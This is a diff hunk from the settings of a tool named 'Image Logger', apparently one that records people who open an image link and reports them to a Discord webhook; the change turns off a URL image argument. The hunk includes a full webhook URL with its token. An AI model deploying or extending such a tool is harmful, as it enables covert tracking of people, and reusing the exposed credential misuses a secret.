@@ -15,7 +15,7 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1216808226469711902/4843PXJctYxuAy8n6y_e2GZi25SJON6s9Cxuaak_FjW_xFvvsBLjdcDLXOeFbqdN-AHr",
     "image": "", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
